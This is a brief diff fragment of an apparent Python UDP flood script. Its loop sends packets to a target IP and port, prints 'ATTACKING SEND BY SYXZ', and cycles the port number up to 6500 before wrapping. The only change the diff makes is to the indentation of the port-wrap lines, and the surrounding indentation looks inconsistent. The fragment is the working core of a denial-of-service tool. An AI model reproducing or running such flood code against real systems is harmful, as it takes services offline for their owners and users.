@@ -14,5 +14,5 @@ while True:
                   pass
 sock.sendto(bytes, (ip, port))
 print (" ( + ) ATTACKING SEND BY SYXZ - ")
-  if port == 6500:
-    port = 1
+if port == 6500:
+  port = 1
